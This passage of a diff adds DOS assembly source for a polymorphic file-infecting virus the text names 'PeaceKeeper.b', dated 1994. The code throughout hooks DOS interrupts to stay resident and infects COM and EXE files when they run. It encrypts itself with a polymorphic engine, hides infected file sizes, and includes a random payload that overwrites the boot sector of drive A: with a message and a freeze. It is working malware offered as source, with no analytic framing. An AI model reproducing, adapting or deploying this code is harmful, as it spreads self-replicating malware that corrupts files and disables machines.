+	     pop     ds 		 ; Load DS from stack (ES)
+
+	     db      10001101b,00010110b ; LEA DX,[imm16]
+	     dw      int21_virus	 ; Offset of int21_virus
+	     int     21h
+
+	     mov     ax,2513h		 ; Set interrupt vector 13h
+	     db      10001101b,00010110b ; LEA DX,[imm16]
+	     dw      int13_virus	 ; Offset of int13_virus
+	     int     21h
+	     pop     ds
+
+	     mov     ax,0deaeh		 ; PeaceKeeper.b function
+	     int     21h
+
+	     jmp     virus_exit
+
+payload_     proc    near		 ; Payload of PeaceKeeper.b
+	     nop
+
+	     call    get_rnd_num
+	     and     ah,00000111b	 ; AH = random number within seven
+	     and     al,00000011b	 ; AL = random number within three
+
+	     cmp     ah,00000111b	 ; Activate payload?
+	     je      test_random	 ; Equal? Jump to test_random
+
+	     jmp     no_error
+test_random:
+	     cmp     al,00000100b	 ; Activate payload?
+	     je      read_sector	 ; Equal? Jump to read_sector
+
+	     jmp     no_error
+read_sector:
+	     cld			 ; Clear direction flag
+
+	     db      10001101b,00011110b ; LEA BX,[imm16]
+	     dw      data_buffe 	 ; Offset of data_buffe
+	     mov     al,00h		 ; Drive A:
+	     mov     cx,01h		 ; Read one sector
+	     sub     dx,dx		 ; DX = starting logical sector
+	     int     25h		 ; Absolute disk read
+
+	     popf			 ; Load flags from stack
+	     jnc     no_error___	 ; No error? Jump to no_error___
+
+	     jmp     error_
+no_error___:
+	     mov     si,bx		 ; SI = offset of data_buffer
+	     cmp     byte ptr [si],11101011b
+	     je      found_jump 	 ; JMP imm8? (opcode 0ebh)? Jump to...
+
+	     jmp     error_
+found_jump:
+	     push    cs 		 ; Save CS at stack
+	     pop     es 		 ; Load ES from stack (CS)
+
+	     lodsb			 ; JMP imm8 (opcode 0ebh)
+	     lodsb			 ; AL = 8-bit immediate
+	     sub     ah,ah		 ; Zero AH
+	     add     si,ax		 ; SI = offset within sector
+
+	     mov     di,si		 ; DI = offset within sector
+	     db      10001101b,00110110b ; LEA SI,[imm16]
+	     dw      mbr		 ; Offset of mbr
+	     mov     cx,(mbr_end-mbr_begin)
+	     rep     movsb		 ; Move Master Boot Record of Peace...
+
+	     sub     dx,dx		 ; DX = starting logical sector
+	     mov     cx,01h		 ; Read one sector
+	     xor     al,al		 ; Drive A:
+	     db      10001101b,00011110b ; LEA BX,[imm16]
+	     dw      data_buffe 	 ; Offset of data_buffe
+	     int     26h		 ; Absolute disk write
+
+	     popf			 ; Load flags from stack
+	     jnc     no_error____	 ; No error? Jump to no_error____
+
+	     jmp     error_
+no_error____:
+	     jmp     no_error
+	     endp
+mbr_begin:
+mbr	     proc    near		 ; Master Boot Record of PeaceKeeper.b
+	     call    delta_offse
+delta_offse:
+	     pop     bx 		 ; Load BX from stack
+	     sub     bx,(delta_offse-mbr)
+
+	     cli			 ; Clear interrupt-enable flag
+	     cld			 ; Clear direction flag
+	     xor     ax,ax		 ; AX = segment of Master Boot Reco...
+	     mov     ss,ax		 ; SS =    "    "    "     "      "
+	     mov     ds,ax		 ; DS =    "    "    "     "      "
+	     mov     sp,7c00h		 ; SP = offset of Master Boot Recor...
+	     sti			 ; Set interrupt-enable flag
+
+	     mov     ax,0b800h		 ; AX = segment of text video RAM
+	     mov     es,ax		 ; ES =    "    "   "     "    "
+
+	     sub     di,di		 ; Zero DI
+	     mov     ax,1f20h		 ; AX = foreground- and backgroundc...
+	     mov     cx,7d0h		 ; Store four thousand bytes
+store_colors:
+	     stosw			 ; Store foreground- and background...
+
+	     loop    store_colors
+
+	     sub     di,di		 ; Zero DI
+	     mov     si,bx		 ; SI = delta offset
+	     db      10000001b,11000110b ; ADD SI,imm16
+	     dw      (message-mbr)	 ; Offset of message
+	     mov     cx,(message_end-messag_begin)
+store_messag:
+	     lodsb			 ; AL = byte of message
+	     stosb			 ; Store byte of message
+
+	     inc     di 		 ; Increase index register
+
+	     loop    store_messag
+
+	     mov     cx,(message_end_-messag_begi_)
+	     mov     di,0a0h		 ; DI = offset witin text video RAM
+store_messa_:
+	     lodsb			 ; AL = byte of message_
+	     stosb			 ; Store byte of message_
+
+	     inc     di 		 ; Increase index register
+
+	     loop    store_messa_
+eternal_loo:
+	     jmp     eternal_loo
+	     endp
+messag_begin:
+message      db      'Peace-Keeper Virus V2.10 '
+message_end:
+messag_begi_:
+message_     db      'Written by Doctor Revenge 18-May-1994 , Italy'
+message_end_:
+mbr_end:
+examine_name proc    near		 ; Examine filename
+	     mov     si,[filename_off]	 ; SI = offset of filename
+
+	     push    [filename_seg]	 ; Save segment of filename at stack
+	     pop     ds 		 ; Load DS from stack (segment of ...)
+
+	     push    cs 		 ; Save CS at stack
+	     pop     es 		 ; Load ES from stack (CS)
+
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     cx,80h		 ; Examine one hundred and twenty-e...
+upcase_char:
+	     lodsb			 ; AL = byte of filename
+
+	     cmp     al,00h		 ; Found end of filename?
+	     je      examine_ext	 ; Equal? Jump to examine_ext
+
+	     cmp     al,'a'              ; Upcase character?
+	     jb      dont_upcase	 ; Below? Jump to dont_upcase
+	     cmp     al,'z'              ; Upcase character?
+	     ja      dont_upcase	 ; Above? Jump to dont_upcase
+
+	     xor     al,00100000b	 ; Upcase character
+dont_upcase:
+	     stosb			 ; Store byte of filename
+
+	     loop    upcase_char
+examine_ext:
+	     stosb			 ; Store zero
+
+	     mov     si,di		 ; SI = offset of end of filename
+	     dec     si 		 ; SI = offset of last byte in file...
+
+	     std			 ; Set direction flag
+
+	     push    cs cs		 ; Save segments at stack
+	     pop     es ds		 ; Load segments from stack
+find_dot:
+	     lodsb			 ; AL = byte of file extension
+	     cmp     al,'.'              ; Dot?
+	     jne     find_dot		 ; Not equal? Jump to find_dot
+
+	     cld			 ; Clear direction flag
+
+	     inc     si 		 ; SI = offset of file extension
+	     inc     si 		 ; "  "   "    "   "       "
+	     mov     ax,si		 ; AX =   "    "   "       "
+
+	     db      10001101b,00111110b ; LEA DI,[imm16]
+	     dw      exe_extensio	 ; Offset of exe_extensio
+	     mov     cx,03h		 ; Compare three bytes
+	     rep     cmpsb		 ; EXE extension?
+	     jne     examine_ext_	 ; Not equal? Jump to examine_ext_
+
+	     mov     [execute_stat],01h  ; EXE executable
+
+	     jmp     examine_nam_
+examine_ext_:
+	     db      10001101b,00111110b ; LEA DI,[imm16]
+	     dw      com_extensio	 ; Offset of com_extensio
+	     mov     si,ax		 ; SI = offset of file extension
+	     mov     cx,03h		 ; Compare three bytes
+	     rep     cmpsb		 ; COM extension?
+	     je      found_ext		 ; Equal? Jump to found_ext
+
+	     jmp     error_
+found_ext:
+	     mov     [execute_stat],00h  ; COM executable
+examine_nam_:
+	     std			 ; Set direction flag
+	     mov     cx,0fh		 ; Search through fifteen bytes
+find_begin:
+	     lodsb			 ; AL = byte of filename
+
+	     cmp     al,':'              ; Found beginning of filename?
+	     je      compare_name	 ; Equal? Jump to compare_name
+	     cmp     al,'\'              ; Found beginning of filename?
+	     je      compare_name	 ; Equal? Jump to compare_name
+
+	     loop    find_begin
+
+	     jmp     error_
+compare_name:
+	     inc     si 		 ; SI = offset of beginning of file...
+	     inc     si 		 ; "  "   "    "      "     "     "
+
+	     cld			 ; Clear direction flag
+	     lodsw			 ; AX = first two bytes of filename
+	     db      10001101b,00111110b ; LEA DI,[imm16]
+	     dw      name_table 	 ; Offset of name_table
+	     mov     cx,(table_end_-table_begin_)/02h
+	     repne   scasw		 ; Found filename?
+	     jne     found_name 	 ; Not equal? Jump to found_name
+
+	     jmp     error_
+found_name:
+	     jmp     no_error
+	     endp
+
+open_file    proc    near		 ; Open file
+	     push    ds 		 ; Save DS at stack
+	     mov     dx,[filename_off]	 ; DX = offset of filename
+	     mov     ds,[filename_seg]	 ; DS = segment of filename
+
+	     mov     ax,3d02h		 ; Open file (read/write)
+	     call    int21_simula
+	     pop     ds 		 ; Load DS from stack
+	     jnc     no_error_		 ; No error? Jump to no_error_
+
+	     jmp     error_
+no_error_:
+	     mov     [file_handle],ax	 ; Store file handle
+
+	     jmp     no_error
+	     endp
+
+close_file   proc    near		 ; Close file
+	     mov     ah,3eh		 ; Close file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+sto_file_att proc    near		 ; Get and set file attributes
+	     push    ds 		 ; Save DS at stack
+	     mov     dx,[filename_off]	 ; DX = offset of filename
+	     mov     ds,[filename_seg]	 ; DS = segment of filename
+
+	     mov     ax,4300h		 ; Get file attributes
+	     call    int21_simula
+	     mov     cs:[file_attr],cx	 ; Store file attributes
+
+	     xor     cx,cx		 ; CX = new file attributes
+	     mov     ax,4301h		 ; Set file attributes
+	     call    int21_simula
+	     pop     ds 		 ; Load DS from stack
+	     jnc     no_error__ 	 ; No error? Jump to no_error__
+
+	     jmp     error_
+no_error__:
+
+	     jmp     no_error
+	     endp
+
+get_file_inf proc    near		 ; Get file's date and time
+	     mov     ax,5700h		 ; Get file's date and time
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     mov     [file_date],dx	 ; Store file date
+	     mov     [file_time],cx	 ; Store file time
+
+	     jmp     no_error
+	     endp
+
+set_file_inf proc    near		 ; Set file's date and time
+	     mov     ax,5701h		 ; Set file's date and time
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,[file_time]	 ; CX = file time
+	     mov     dx,[file_date]	 ; DX = file date
+
+	     cmp     [infect_stat],00h	 ; Don't infect file?
+	     jne     dont_infect	 ; Not equal? Jump to dont_infect
+
+	     or      cl,00011111b	 ; Set infection mark (60 seconds)
+	     and     cl,11111110b	 ;  "      "      "     "    "
+dont_infect:
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+int24_store  proc    near		 ; Get and set interrupt vector 24h
+	     push    es 		 ; Save ES at stack
+	     sub     ax,ax		 ; Zero AX
+	     mov     es,ax		 ; ES = segment of interrupt table
+
+	     mov     ax,es:[(24h*04h)]	 ; Set interrupt vector 24h
+	     mov     es:[(24h*04h)],offset int24_virus
+	     mov     word ptr [int24_addr],ax
+
+	     mov     ax,es:[(24h*04h+02h)]
+	     mov     es:[(24h*04h+02h)],cs
+	     mov     word ptr [int24_addr+02h],ax
+	     pop     es 		 ; Save ES at stack
+
+	     jmp     no_error
+	     endp
+
+int24_load   proc    near		 ; Set interrupt vector 24h
+	     push    es 		 ; Save ES at stack
+	     sub     bx,bx		 ; Zero BX
+
+	     push    bx 		 ; Save BX at stack
+	     pop     es 		 ; Load ES from stack
+
+	     mov     ax,word ptr [int24_addr]
+	     mov     es:[(24h*04h)],ax	 ; Set interrupt vector 24h
+
+	     mov     ax,word ptr [int24_addr+02h]
+	     mov     es:[(24h*04h+02h)],ax
+	     pop     es 		 ; Load ES from stack
+
+	     jmp     no_error
+	     endp
+
+set_file_pos proc    near		 ; Set current file position
+	     push    cx bx		 ; Save registers at stack
+	     mov     ah,42h		 ; Set current file position
+	     sub     cx,cx		 ; CX:DX = offset from origin of ne...
+	     mov     dx,cx		 ;   "   "   "     "     "    "    "
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     pop     bx cx		 ; Load registers from stack
+
+	     jmp     no_error
+	     endp
+
+div_by_pages proc    near		 ; Divide by pages
+	     mov     cx,200h		 ; Divide by pages
+	     div     cx 		 ; DX:AX = filesize in pages
+
+	     or      dx,dx		 ; No bytes in last 512-bytes page ...
+	     jz      dont_inc_pag	 ; Zero? Jump to dont_inc_pag
+
+	     inc     ax 		 ; Increase total number of 512-byt...
+dont_inc_pag:
+	     ret
+	     endp
+
+get_filesize proc    near		 ; Get filesize
+	     mov     ax,word ptr [filesize]
+	     mov     dx,word ptr [filesize+02h]
+
+	     ret			 ; Return
+	     endp
+
+infect_exe   proc    near		 ; Infect EXE file
+	     mov     [infect_stat],01h	 ; Infect file
+
+	     mov     al,00h		 ; Set current file position (SOF)
+	     call    set_file_pos
+
+	     mov     ah,3fh		 ; Read from file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,1ch		 ; Read twenty-eight bytes
+	     db      10001101b,00010110b ; LEA DX,[imm16]
+	     dw      data_buffer	 ; Offset of data_buffer
+	     call    int21_simula
+
+	     db      10001101b,00110110b ; LEA SI,[imm16]
+	     dw      data_buffer	 ; Offset of data_buffer
+	     cmp     word ptr [si],'ZM'  ; Found EXE signature
+	     je      exam_header	 ; Equal? Jump to exam_header
+
+	     jmp     error_
+exam_header:
+	     cmp     word ptr [si+12h],0deadh
+	     jne     exam_header_	 ; Already infected? Jump to exam_h...
+
+	     jmp     error_
+exam_header_:
+	     cmp     word ptr [si+18h],40h
+	     jb      test_overlay	 ; New executable? Jump to test_overlay
+
+	     sub     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,3ch		 ; DX = offset of new executable he...
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     jnc     read_header	 ; No error? Jump to read_header
+
+	     jmp     error_
+read_header:
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,04h		 ; Read four bytes
+	     db      10001101b,00010110b ; LEA DX,[imm16]
+	     dw      data_buffer_	 ; Offset of data_buffer_
+	     call    int21_simula
+	     jnc     read_offset	 ; No error? Jump to read_offset
+
+	     jmp     error_
+read_offset:
+	     mov     dx,word ptr [data_buffer_]
+	     mov     cx,word ptr [data_buffer_+02h]
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     jnc     read_header_	 ; No error? Jump to read_header_
+
+	     jmp     error_
+read_header_:
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,04h		 ; Read four bytes
+	     db      10001101b,00010110b ; LEA DX,[imm16]
+	     dw      data_buffer_	 ; Offset of data_buffer_
+	     call    int21_simula
+	     jnc     exam_heade 	 ; No error? Jump to exam_heade
+
+	     jmp     error_
+exam_heade:
+	     cmp     [data_buffer_+01h],'E'
+	     jne     test_overlay	 ; New executable? Jump to test_ove...
+
+	     jmp     error_
+test_overlay:
+	     call    get_filesize
+	     call    div_by_pages
+
+	     cmp     [si+04h],ax	 ; Internal overlay?
+	     je      test_overla	 ; Equal? Jump to test_overla
+
+	     jmp     error_
+test_overla:
+	     cmp     [si+02h],dx	 ; Internal overlay?
+	     je      test_memory	 ; Equal? Jump to test_memory
+
+	     jmp     error_
+test_memory:
+	     cmp     word ptr [si+0ch],00h
+	     jne     test_overla_	 ; Not equal? Jump to test_overla_
+
+	     jmp     error_
+test_overla_:
+	     cmp     word ptr [si+1ah],00h
+	     je      modify_head	 ; Main program? Jump to modify_head
+
+	     jmp     error_
+modify_head:
+	     call    get_filesize
+
+	     mov     bx,10h		 ; Divide by paragraphs
+	     div     bx 		 ; AX:DX = filesize in paragraphs
+	     mov     [delta_offse_],dx	 ; Store delta offset
+	     sub     ax,[si+08h]	 ; Subtract headersize in paragraph...
+
+	     push    word ptr [si+16h]	 ; Save initial CS relative to star...
+	     pop     [initial_cs]	 ; Load initial_cs (initial CS rel...)
+	     mov     [si+16h],ax	 ; Store initial CS relative to sta...
+
+	     push    word ptr [si+0eh]	 ; Save initial SS relative to star...
+	     pop     [initial_ss]	 ; Load initial_ss (initial SS rel...)
+	     mov     [si+0eh],ax	 ; Store initial SS relative to sta...
+
+	     push    word ptr [si+14h]	 ; Save initial IP at stack
+	     pop     [initial_ip]	 ; Load initial_ip (initial IP)
+	     mov     [si+14h],dx	 ; Store initial IP
+
+	     push    word ptr [si+10h]	 ; Save initial SP at stack
+	     pop     [initial_sp]	 ; Load initial_sp (initial SP)
+	     mov     word ptr [si+10h],2000h
+
+	     call    get_rnd_num
+
+	     mov     bl,[flags] 	 ; BL = flags
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     bp,[delta_offse_]	 ; BP = delta offset
+	     push    si 		 ; Save SI at stack
+	     call    mcg_start
+	     pop     si 		 ; Load SI from stack
+
+	     call    get_filesize
+	     add     ax,(code_end-code_begin)
+	     adc     dx,00h		 ; Convert to 32-bit
+
+	     add     ax,[dec_length]	 ; Add length of decryptor to size ...
+	     adc     dx,00h		 ; Convert to 32-bit
+	     call    div_by_pages
+	     mov     [si+04],ax 	 ; Store total number of 512-byte p...
+	     mov     [si+02],dx 	 ; Store number of bytes in last 51...
+
+	     cmp     word ptr [si+0ch],0ffffh
+	     jne     write_header	 ; Not equal? Jump to write_header
+
+	     mov     word ptr [si+0ch],0ffffh
+write_header:
+	     mov     word ptr [si+12h],0deadh
+
+	     mov     al,00h		 ; Set current file position (SOF)
+	     call    set_file_pos
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,1ch		 ; Read twenty-eight bytes
+	     db      10001101b,00010110b ; LEA DX,[imm16]
+	     dw      data_buffer	 ; Offset of data_buffer
+	     call    int21_simula
+
+	     mov     [infect_stat],00h	 ; Don't infect file
+
+	     jmp     no_error
+	     endp
+
+infect_com   proc    near		 ; Infect COM file
+	     mov     [regs_assigned],00h ; Index and count register hasn't b..
+
+	     mov     ax,0bb8h		 ; Filesize too small?
+	     cmp     ax,word ptr [filesize]
+	     jb      prepare_infe	 ; Below? Jump to prepare_infe
+
+	     jmp     error_
+prepare_infe:
+	     mov     al,00h		 ; Set current file position (SOF)
+	     call    set_file_pos
+
+	     sub     ax,ax		 ; Zero AX
+	     mov     [part_offse],ax	 ; Zero offset in file of current p...
+	     mov     [part_length],ax	 ; Zero length of polymorphic parts...
+	     mov     [part_offset],ax	 ; Zero offset in file of current p...
+	     mov     [part_offset_],offset data_buffe_
+
+	     call    get_rnd_num
+	     sub     ah,ah		 ; AL = 8-bit random number
+	     and     al,00000011b	 ; AL = random number within three
+	     inc     al 		 ; "  "   "      "      "      "
+	     inc     al 		 ; "  "   "      "      "      "
+
+	     mov     [poly_parts],ax	 ; Store number of polymorphic parts
+	     mov     cx,ax		 ; CX = number of polymorphic parts
+gen_parts:
+	     push    cx 		 ; Save CX at stack
+	     call    get_rnd_num
+	     sub     ah,ah		 ; AL = 8-bit random number
+	     and     al,00000111b	 ; AL = random number within seven
+	     inc     al 		 ; "  "   "      "      "      "
+
+	     mov     cx,ax		 ; CX = number of garbage instructions
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+gen_garbage:
+	     call    some_garbage_
+
+	     dec     cx 		 ; Decrease count register
+	     jnz     gen_garbage	 ; Not zero? Jump to gen_garbage
+
+	     mov     al,11101001b	 ; JMP imm16 (opcode 0e9h)
+	     stosb			 ; Store JMP imm16 (opcode 0e9h)
+
+	     push    di 		 ; Save DI at stack
+	     lea     bx,data_buffe	 ; BX = offset of data_buffe
+	     sub     di,bx		 ; DI = length of polymorphic part
+	     inc     di 		 ; "  "   "    "       "       "
+	     inc     di 		 ; "  "   "    "       "       "
+
+	     add     [part_offset],di	 ; Add length of polymorphic part t...
+	     mov     [part_length_],di	 ; Store length of current polymorp...
+	     pop     di 		 ; Load DI from stack
+	     pop     cx 		 ; Load CX from stack
+
+	     cmp     cx,01h		 ; Last polymorphic part?
+	     push    cx 		 ; Save CX at stack
+	     je      gen_par_exit	 ; Equal? Jump to gen_par_exit
+offset_error:
+	     call    get_rnd_num
+
+	     xor     ah,ah		 ; AL = 8-bit random number
+	     and     al,00111111b	 ; AL = random number within sixty-...
+	     mov     bx,20h		 ; Multiply by thirty-two
+	     mul     ax 		 ; AX = offset in file of next poly...
+
+	     mov     dx,[part_offset]	 ; DX = offset in file of current p...
+	     add     dx,ax		 ; DX = offset im file of next poly...
+
+	     cmp     dx,word ptr [filesize]
+	     ja      offset_error	 ; Above? Jump to offset_error
+
+	     stosw			 ; Store 16-bit immediate
+	     add     [part_offset],ax	 ; Add offset of in file of next po...
+
+	     jmp     lod_sto_part
+gen_par_exit:
+	     mov     ax,word ptr [filesize]
+	     sub     ax,[part_offset]	 ; AX = 16-bit immediate
+	     stosw			 ; Store 16-bit immediate
+lod_sto_part:
+	     call    lod_sto_file
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    gen_parts
+
+	     call    get_rnd_num
+
+	     mov     bl,[flags] 	 ; BL = flags
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     bp,word ptr [filesize]
+	     add     bp,100h		 ; BP = delta offset
+	     push    si 		 ; Save SI at stack
+	     call    mcg_start
+	     pop     si 		 ; Load SI from stack
+
+	     jmp     no_error
+	     endp
+
+lod_sto_file proc    near		 ; Read original part, write polymo...
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,[part_length_]	 ; CX = length of current polymorph...
+	     mov     si,[part_offset_]	 ; SI = offset in memory of current...
+
+	     push    [part_length_]	 ; Save length of current polymorph...
+	     pop     [si]		 ; Load   "    "     "         "
+	     push    [part_offse]	 ; Save offset in file of current p...
+	     pop     [si+02h]		 ; Load   "    "   "   "     "     "
+
+	     mov     dx,[part_offset_]	 ; DX = offset in memory of current...
+	     add     dx,04h		 ; "  "   "    "     "   "      "
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     add     [part_offset_],ax	 ; Add length of current polymorphi...
+	     add     [part_offset_],04h  ;  "    "    "     "          "
+	     add     [part_length],ax	 ;  "    "    "     "          "
+	     add     [part_length],04h	 ;  "    "    "     "          "
+
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     sub     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,[part_offse]	 ; DX = offset in file of current p...
+	     call    int21_simula
+
+	     mov     ah,40h		 ; Write to file
+	     mov     cx,[part_length_]	 ; CX = length of current polymorph...
+	     lea     dx,data_buffe	 ; DX = offset of data_buffe
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     xor     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,[part_offset]	 ; DX = offset in file of current p...
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+	     mov     [part_offse],ax	 ; Store offset in file of current ...
+
+	     jmp     no_error
+	     endp
+
+mark_com     proc    near		 ; Set infection mark of COM file
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     mov     cx,[part_length]	 ; CX = length of polymorphic parts...
+	     add     cx,02h		 ; Add length of infection mark to ...
+
+	     lea     si,data_buffe_	 ; SI = offset of data_buffe_
+	     add     si,[part_length]	 ; SI = offset of end of data_buffe_
+	     mov     word ptr [si],0deadh
+
+	     lea     dx,data_buffe_	 ; DX = offset of data_buffe_
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+examine_com  proc    near		 ; Examine COM file
+	     mov     ax,4200h		 ; Set current file position (SOF)
+	     sub     cx,cx		 ; CX = high-order word of offset f...
+	     mov     dx,word ptr [filesize]
+	     sub     dx,02h		 ; DX = low-order word of offset fi...
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     mov     ah,3fh		 ; Read from file
+	     mov     cx,02h		 ; Read two bytes
+	     db      10001101b,00010110b ; LEA DX,[imm16]
+	     dw      data_buffer	 ; Offset of data_buffer
+	     call    int21_simula
+	     cmp     word ptr [data_buffer],0deadh
+	     je      infected		 ; Equal? Jump to infected
+
+	     jmp     no_error
+infected:
+	     jmp     error_
+	     endp
+
+infect_file  proc    near		 ; Infect COM/EXE file
+	     mov     al,02h		 ; Set current file position (EOF)
+	     call    set_file_pos
+
+	     lea     dx,data_buffe	 ; DX = offset of data_buffe
+	     mov     cx,[dec_length]	 ; CX = length of decryptor
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     cmp     [execute_stat],01h  ; EXE executable?
+	     je      infect_exe_	 ; Equal? Jump to infect_exe_
+	     cmp     [execute_stat],00h  ; COM executable?
+	     je      infect_com_	 ; Equal? Jump to infect_com_
+eternal_loo_:
+	     jmp     eternal_loo_
+infect_exe_:
+	     call    calc_virus
+	     push    dx 		 ; Save DX at stack
+
+	     mov     cx,ax		 ; CX = number of paragraphs
+	     lea     si,code_begin	 ; SI = offset of code_begin
+encrypt_loop:
+	     push    cx 		 ; Save CX at stack
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     mov     cx,200h		 ; CX = number of bytes to encrypt
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    encrypt_loop
+
+	     pop     cx 		 ; Load CX from stack (DX)
+	     lea     di,data_buffe	 ; DI = offset of data_buffe
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     jmp     no_error
+infect_com_:
+	     call    calc_virus
+	     push    dx 		 ; Save DX at stack
+
+	     mov     cx,ax		 ; CX = number of paragraphs
+	     lea     si,code_begin	 ; SI = offset of code_begin
+encrypt_loo:
+	     push    cx 		 ; Save CX at stack
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     mov     cx,200h		 ; CX = number of bytes to encrypt
+	     lea     di,data_buffe_	 ; DI = offset of data_buffe_
+	     add     di,[part_length]	 ; DI = offset of end of data_buffe_
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     pop     cx 		 ; Load CX from stack
+	     loop    encrypt_loo
+
+	     pop     cx 		 ; Load CX from stack (DX)
+	     lea     di,data_buffe_	 ; DI = offset of data_buffe_
+	     add     di,[part_length]	 ; DI = offset of end of data_buffe_
+	     mov     dx,[encrypt_key]	 ; DX = encryption/decryption key
+	     call    encrypt_body
+
+	     mov     ah,40h		 ; Write to file
+	     mov     bx,[file_handle]	 ; BX = file handle
+	     call    int21_simula
+
+	     jmp     no_error
+	     endp
+
+calc_virus   proc    near		 ; Calculate size of virus in parag...
+	     sub     dx,dx		 ; Zero DX
+	     mov     bx,200h		 ; Divide by pages
+	     mov     ax,(code_end-code_begin)
+	     div     bx 		 ; AX:DX = size of virus in paragraphs
+
+	     ret			 ; Return
+	     endp
+
+save_regs    proc    near		 ; Save registers
+	     mov     cs:[ax_],ax	 ; Store accumulator register
+	     mov     cs:[bx_],bx	 ; Store base register
+	     mov     cs:[cx_],cx	 ; Store count register
+	     mov     cs:[dx_],dx	 ; Store data register
+	     mov     cs:[si_],si	 ; Store source index
+	     mov     cs:[di_],di	 ; Store destination index
+	     mov     cs:[bp_],bp	 ; Store base pointer
+	     mov     cs:[ds_],ds	 ; Store data segment
+	     mov     cs:[es_],es	 ; Store extra segment
+
+	     nop
+	     ret			 ; Return
+	     endp
+
+load_regs    proc    near		 ; Load registers
+	     mov     ax,cs:[ax_]	 ; AX = accumulator register
+	     mov     bx,cs:[bx_]	 ; BX = base register
+	     mov     cx,cs:[cx_]	 ; CX = count register
+	     mov     dx,cs:[dx_]	 ; DX = data register
+	     mov     si,cs:[si_]	 ; SI = source index
+	     mov     di,cs:[di_]	 ; DI = destination index
+	     mov     bp,cs:[bp_]	 ; BP = base pointer
+	     mov     ds,cs:[ds_]	 ; DS = data segment
+	     mov     es,cs:[es_]	 ; ES = extra segment
+
+	     nop
+	     ret			 ; Return
+	     endp
+
+int24_virus  proc    near		 ; Interrupt 24h of PeaceKeeper.b
+	     mov     al,03h		 ; AL = fail system call in progress
+
+	     iret			 ; Interrupt return
+	     endp
+
+int21_virus  proc    near		 ; Interrupt 21h of PeaceKeeper.b
+	     cmp     ax,0deadh		 ; PeaceKeeper.b function?
+	     jne     determ_func	 ; Not equal? Jump to determ_func
+
+	     mov     bx,ax		 ; Already resident
+
+	     iret			 ; Interrupt return
+determ_func:
+	     cmp     ax,0deaeh		 ; PeaceKeeper.b function?
+	     je      init_rnd_nu	 ; Equal? Jump to init_rnd_nu
+	     cmp     ax,4b00h		 ; Load and execute program?
+	     je      load_and_exe	 ; Equal? Jump to load_and_exe
+	     cmp     ah,11h		 ; Find first matching file (FCB)?
+	     je      fcb_stealth	 ; Equal? Jump to fcb_stealth
+	     cmp     ah,12h		 ; Find next matching file (FCB)?
+	     je      fcb_stealth	 ; Equal? Jump to fcb_stealth
+int21_exit:
+	     jmp     cs:[int21_addr_]
+
+	     iret			 ; Interrupt return
+	     endp
+
+int21_simula proc    near		 ; Simulate interrupt 21h
+	     pushf			 ; Save flags at stack
+
+	     call    cs:[int21_addr]
+
+	     ret			 ; Return
+	     endp
+init_rnd_nu:
+	     call    save_regs
+	     call    init_rnd_num
+	     call    load_regs
+load_and_exe:
+	     call    save_regs
+
+	     mov     cs:[filename_off],dx
+	     mov     cs:[filename_seg],ds
+
+	     push    cs 		 ; Save CS at stack
+	     pop     ds 		 ; Load DS from stack
+
+	     call    int24_store
+	     call    infect_file_
+	     call    int24_load
+	     call    load_regs
+
+	     jmp     int21_exit
+fcb_stealth:
+	     pushf			 ; Save flags at stack
+	     call    int21_simula
+	     popf			 ; Load flags from stack
+	     test    al,al		 ; Successfull?
+	     jnz     filesiz_exi_	 ; Not zero? Jump to filesize_exi_
+
+	     push    ax bx dx si es ds	 ; Save registers at stack
+
+	     mov     ah,51h		 ; Get current PSP address
+	     call    int21_simula
+	     mov     es,bx		 ; ES = segment of PSP for current ...
+	     cmp     bx,es:[16h]	 ; Parent PSP equal to current PSP?
+	     jne     filesiz_exit	 ; Not equal? Jump to filesiz_exit
+
+	     mov     si,dx		 ; SI = offset of unopened FCB
+
